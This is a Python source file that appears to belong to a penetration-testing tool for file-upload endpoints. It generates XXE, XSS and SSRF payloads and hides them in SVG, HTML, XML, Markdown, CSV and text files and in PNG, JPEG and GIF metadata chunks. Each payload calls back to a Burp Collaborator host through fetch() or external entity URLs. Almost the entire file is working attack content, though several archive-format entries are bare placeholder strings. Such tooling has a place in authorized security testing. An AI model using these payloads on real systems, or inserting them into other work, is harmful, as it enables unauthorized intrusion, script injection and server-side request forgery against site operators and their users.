from pathlib import Path
from PIL import Image
import struct
import zlib

def create_png_with_metadata(payload_content, burp_collab):
    img = Image.new('RGB', (100, 100), color='red')
    import io
    img_bytes = io.BytesIO()
    img.save(img_bytes, 'PNG')
    png_data = bytearray(img_bytes.getvalue())
    
    iTXt_chunk = payload_content.encode('utf-8')
    iTXt_length = struct.pack('>I', len(iTXt_chunk))
    iTXt_type = b'iTXt'
    crc_data = iTXt_type + iTXt_chunk
    crc = zlib.crc32(crc_data) & 0xffffffff
    iTXt_crc = struct.pack('>I', crc)
    
    iend_pos = png_data.rfind(b'IEND')
    if iend_pos != -1:
        iend_chunk_start = iend_pos - 4
        new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
        png_data[iend_chunk_start:iend_chunk_start] = new_chunk
    
    return bytes(png_data)

def create_jpg_with_metadata(payload_content, burp_collab):
    img = Image.new('RGB', (100, 100), color='red')
    import io
    img_bytes = io.BytesIO()
    img.save(img_bytes, 'JPEG', quality=95)
    jpg_data = bytearray(img_bytes.getvalue())
    
    com_marker = b'\xFF\xFE'
    com_payload = payload_content.encode('utf-8')
    com_length = struct.pack('>H', len(com_payload) + 2)
    com_chunk = com_marker + com_length + com_payload
    
    soi_pos = jpg_data.find(b'\xFF\xD8')
    if soi_pos != -1:
        insert_pos = soi_pos + 2
        jpg_data[insert_pos:insert_pos] = com_chunk
    
    return bytes(jpg_data)

def create_gif_with_metadata(payload_content, burp_collab):
    img = Image.new('RGB', (100, 100), color='red')
    import io
    img_bytes = io.BytesIO()
    img.save(img_bytes, 'GIF')
    gif_data = bytearray(img_bytes.getvalue())
    
    comment_extension = b'\x21\xFE'
    comment_payload = payload_content.encode('utf-8')
    
    comment_chunks = []
    remaining = comment_payload
    while remaining:
        chunk_size = min(len(remaining), 255)
        comment_chunks.append(bytes([chunk_size]) + remaining[:chunk_size])
        remaining = remaining[chunk_size:]
    comment_chunks.append(b'\x00')
    
    comment_block = comment_extension + b''.join(comment_chunks)
    
    logical_screen_pos = gif_data.find(b'GIF89a')
    if logical_screen_pos != -1:
        insert_pos = logical_screen_pos + 13
        gif_data[insert_pos:insert_pos] = comment_block
    
    return bytes(gif_data)

def generate_extended_payloads(output_dir, target_ext, burp_collab):
    output_dir = Path(output_dir)
    base_url = f"http://{burp_collab}"
    
    extended_dir = output_dir / 'extended'
    extended_dir.mkdir(exist_ok=True)
    
    extended_mappings = {
        'xml': {
            'svg': {
                'xxe': [
                    ('xxe1_svg', f'''<?xml version="1.0"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "{base_url}/xxe-svg-xml">
]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text>
</svg>'''),
                    ('xxe2_svg_https', f'''<?xml version="1.0"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "https://{burp_collab}/xxe-svg-xml-https">
]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text>
</svg>'''),
                ],
                'xss': [
                    ('xss1_svg', f'''<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('{base_url}/xss-svg-xml')">
<rect width="100" height="100" fill="red"/>
</svg>'''),
                    ('xss2_svg_script', f'''<svg xmlns="http://www.w3.org/2000/svg">
<script>fetch('{base_url}/xss-svg-xml-script')</script>
</svg>'''),
                ],
                'ssrf': [
                    ('ssrf1_svg', f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="{base_url}/ssrf-svg-xml"/>
</svg>'''),
                ],
            },
            'html': {
                'xss': [
                    ('xss1_html', f'''<!DOCTYPE html>
<html>
<body>
<script>fetch('{base_url}/xss-html-xml')</script>
</body>
</html>'''),
                    ('xss2_html_img', f'''<!DOCTYPE html>
<html>
<body>
<img src=x onerror="fetch('{base_url}/xss-html-xml-img')">
</body>
</html>'''),
                ],
                'ssrf': [
                    ('ssrf1_html', f'''<!DOCTYPE html>
<html>
<body>
<img src="{base_url}/ssrf-html-xml">
</body>
</html>'''),
                ],
            },
        },
        'docx': {
            'zip': {
                'xxe': [
                    ('xxe1_zip', 'ZIP content with XXE - requires actual ZIP structure'),
                ],
            },
        },
        'xlsx': {
            'zip': {
                'xxe': [
                    ('xxe1_zip', 'ZIP content with XXE - requires actual ZIP structure'),
                ],
            },
        },
        'pptx': {
            'zip': {
                'xxe': [
                    ('xxe1_zip', 'ZIP content with XXE - requires actual ZIP structure'),
                ],
            },
        },
        'zip': {
            'docx': {
                'xxe': [
                    ('xxe1_docx', 'DOCX structure in ZIP - requires actual DOCX structure'),
                ],
            },
            'xlsx': {
                'xxe': [
                    ('xxe1_xlsx', 'XLSX structure in ZIP - requires actual XLSX structure'),
                ],
            },
            'pptx': {
                'xxe': [
                    ('xxe1_pptx', 'PPTX structure in ZIP - requires actual PPTX structure'),
                ],
            },
            'jar': {
                'rce': [
                    ('rce1_jar', 'JAR structure in ZIP - requires actual JAR structure'),
                ],
            },
            'epub': {
                'xxe': [
                    ('xxe1_epub', 'EPUB structure in ZIP - requires actual EPUB structure'),
                ],
            },
        },
        'jar': {
            'zip': {
                'xxe': [
                    ('xxe1_zip', 'ZIP content with XXE - requires actual ZIP structure'),
                ],
            },
        },
        'epub': {
            'zip': {
                'xxe': [
                    ('xxe1_zip', 'ZIP content with XXE - requires actual ZIP structure'),
                ],
            },
        },
        'odt': {
            'zip': {
                'xxe': [
                    ('xxe1_zip', 'ZIP content with XXE - requires actual ZIP structure'),
                ],
            },
        },
        'ods': {
            'zip': {
                'xxe': [
                    ('xxe1_zip', 'ZIP content with XXE - requires actual ZIP structure'),
                ],
            },
        },
        'odp': {
            'zip': {
                'xxe': [
                    ('xxe1_zip', 'ZIP content with XXE - requires actual ZIP structure'),
                ],
            },
        },
        'svg': {
            'html': {
                'xss': [
                    ('xss1_html', f'''<svg xmlns="http://www.w3.org/2000/svg">
<foreignObject>
<iframe src="javascript:fetch('{base_url}/xss-html-svg')"></iframe>
</foreignObject>
</svg>'''),
                    ('xss2_html_script', f'''<svg xmlns="http://www.w3.org/2000/svg">
<script>fetch('{base_url}/xss-html-svg-script')</script>
</svg>'''),
                ],
            },
            'xml': {
                'xxe': [
                    ('xxe1_xml', f'''<?xml version="1.0"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "{base_url}/xxe-xml-svg">
]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text>
</svg>'''),
                ],
            },
        },
        'html': {
            'svg': {
                'xss': [
                    ('xss1_svg', f'''<!DOCTYPE html>
<html>
<body>
<svg onload="fetch('{base_url}/xss-svg-html')" xmlns="http://www.w3.org/2000/svg">
<rect width="100" height="100" fill="red"/>
</svg>
</body>
</html>'''),
                ],
                'ssrf': [
                    ('ssrf1_svg', f'''<!DOCTYPE html>
<html>
<body>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="{base_url}/ssrf-svg-html"/>
</svg>
</body>
</html>'''),
                ],
            },
            'xml': {
                'xxe': [
                    ('xxe1_xml', f'''<?xml version="1.0"?>
<!DOCTYPE html [
<!ENTITY xxe SYSTEM "{base_url}/xxe-xml-html">
]>
<html>
<body>&xxe;</body>
</html>'''),
                ],
            },
            'md': {
                'xss': [
                    ('xss1_md', f'''<script>fetch('{base_url}/xss-md-html')</script>
# Markdown content
'''),
                ],
            },
        },
        'txt': {
            'html': {
                'xss': [
                    ('xss1_html', f'''<script>fetch('{base_url}/xss-html-txt')</script>'''),
                    ('xss2_html_img', f'''<img src=x onerror="fetch('{base_url}/xss-html-txt-img')">'''),
                ],
            },
            'svg': {
                'xss': [
                    ('xss1_svg', f'''<svg onload="fetch('{base_url}/xss-svg-txt')" xmlns="http://www.w3.org/2000/svg"></svg>'''),
                ],
            },
            'xml': {
                'xxe': [
                    ('xxe1_xml', f'''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{base_url}/xxe-xml-txt">
]>
<root>&xxe;</root>'''),
                ],
            },
            'csv': {
                'xss': [
                    ('xss1_csv', f'''<script>fetch('{base_url}/xss-csv-txt')</script>'''),
                ],
            },
            'md': {
                'xss': [
                    ('xss1_md', f'''<script>fetch('{base_url}/xss-md-txt')</script>
# Markdown
'''),
                ],
            },
        },
        'csv': {
            'html': {
                'xss': [
                    ('xss1_html', f'''<script>fetch('{base_url}/xss-html-csv')</script>'''),
                ],
            },
            'txt': {
                'xss': [
                    ('xss1_txt', f'''<script>fetch('{base_url}/xss-txt-csv')</script>'''),
                ],
            },
            'xml': {
                'xxe': [
                    ('xxe1_xml', f'''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{base_url}/xxe-xml-csv">
]>
<root>&xxe;</root>'''),
                ],
            },
        },
        'md': {
            'html': {
                'xss': [
                    ('xss1_html', f'''<script>fetch('{base_url}/xss-html-md')</script>'''),
                ],
            },
            'svg': {
                'xss': [
                    ('xss1_svg', f'''<svg onload="fetch('{base_url}/xss-svg-md')" xmlns="http://www.w3.org/2000/svg"></svg>'''),
                ],
            },
            'xml': {
                'xxe': [
                    ('xxe1_xml', f'''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{base_url}/xxe-xml-md">
]>
<root>&xxe;</root>'''),
                ],
            },
        },
        'markdown': {
            'html': {
                'xss': [
                    ('xss1_html', f'''<script>fetch('{base_url}/xss-html-markdown')</script>'''),
                ],
            },
            'svg': {
                'xss': [
                    ('xss1_svg', f'''<svg onload="fetch('{base_url}/xss-svg-markdown')" xmlns="http://www.w3.org/2000/svg"></svg>'''),
                ],
            },
            'xml': {
                'xxe': [
                    ('xxe1_xml', f'''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{base_url}/xxe-xml-markdown">
]>
<root>&xxe;</root>'''),
                ],
            },
        },
        'png': {
            'svg': {
                'xss': [
                    ('xss1_svg', f'''XML:com.adobe.xmp\x00\x00<svg onload="fetch('{base_url}/xss-svg-png')" xmlns="http://www.w3.org/2000/svg"><rect width="100" height="100" fill="red"/></svg>'''),
                ],
                'ssrf': [
                    ('ssrf1_svg', f'''XML:com.adobe.xmp\x00\x00<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="{base_url}/ssrf-svg-png"/></svg>'''),
                ],
            },
            'html': {
                'xss': [
                    ('xss1_html', f'''XML:com.adobe.xmp\x00\x00<!DOCTYPE html><html><body><script>fetch('{base_url}/xss-html-png')</script></body></html>'''),
                ],
            },
            'xml': {
                'xxe': [
                    ('xxe1_xml', f'''XML:com.adobe.xmp\x00\x00<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-xml-png">%x;]><xmp>test</xmp>'''),
                ],
            },
        },
        'jpg': {
            'svg': {
                'xss': [
                    ('xss1_svg', f'''<svg onload="fetch('{base_url}/xss-svg-jpg')" xmlns="http://www.w3.org/2000/svg"><rect width="100" height="100" fill="red"/></svg>'''),
                ],
                'ssrf': [
                    ('ssrf1_svg', f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="{base_url}/ssrf-svg-jpg"/></svg>'''),
                ],
            },
            'html': {
                'xss': [
                    ('xss1_html', f'''<!DOCTYPE html><html><body><script>fetch('{base_url}/xss-html-jpg')</script></body></html>'''),
                ],
            },
            'xml': {
                'xxe': [
                    ('xxe1_xml', f'''<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-xml-jpg">%x;]><x>test</x>'''),
                ],
            },
        },
        'jpeg': {
            'svg': {
                'xss': [
                    ('xss1_svg', f'''<svg onload="fetch('{base_url}/xss-svg-jpeg')" xmlns="http://www.w3.org/2000/svg"><rect width="100" height="100" fill="red"/></svg>'''),
                ],
                'ssrf': [
                    ('ssrf1_svg', f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="{base_url}/ssrf-svg-jpeg"/></svg>'''),
                ],
            },
            'html': {
                'xss': [
                    ('xss1_html', f'''<!DOCTYPE html><html><body><script>fetch('{base_url}/xss-html-jpeg')</script></body></html>'''),
                ],
            },
            'xml': {
                'xxe': [
                    ('xxe1_xml', f'''<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-xml-jpeg">%x;]><x>test</x>'''),
                ],
            },
        },
        'gif': {
            'svg': {
                'xss': [
                    ('xss1_svg', f'''<svg onload="fetch('{base_url}/xss-svg-gif')" xmlns="http://www.w3.org/2000/svg"><rect width="100" height="100" fill="red"/></svg>'''),
                ],
                'ssrf': [
                    ('ssrf1_svg', f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="{base_url}/ssrf-svg-gif"/></svg>'''),
                ],
            },
            'html': {
                'xss': [
                    ('xss1_html', f'''<!DOCTYPE html><html><body><script>fetch('{base_url}/xss-html-gif')</script></body></html>'''),
                ],
            },
            'xml': {
                'xxe': [
                    ('xxe1_xml', f'''<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-xml-gif">%x;]><x>test</x>'''),
                ],
            },
        },
    }
    
    if target_ext not in extended_mappings:
        return
    
    mappings = extended_mappings[target_ext]
    
    for source_ext, vulns in mappings.items():
        source_dir = extended_dir / source_ext
        source_dir.mkdir(exist_ok=True)
        
        for vuln_type, payloads in vulns.items():
            vuln_dir = source_dir / vuln_type
            vuln_dir.mkdir(exist_ok=True)
            
            for payload_name, payload_content in payloads:
                filename = f"{payload_name}.{target_ext}"
                file_path = vuln_dir / filename
                
                if target_ext in ['png', 'jpg', 'jpeg', 'gif']:
                    if target_ext == 'png':
                        image_data = create_png_with_metadata(payload_content, burp_collab)
                    elif target_ext in ['jpg', 'jpeg']:
                        image_data = create_jpg_with_metadata(payload_content, burp_collab)
                    elif target_ext == 'gif':
                        image_data = create_gif_with_metadata(payload_content, burp_collab)
                    else:
                        image_data = None
                    
                    if image_data:
                        with open(file_path, 'wb') as f:
                            f.write(image_data)
                    else:
                        with open(file_path, 'w', encoding='utf-8') as f:
                            f.write(payload_content)
                else:
                    with open(file_path, 'w', encoding='utf-8') as f:
                        f.write(payload_content)

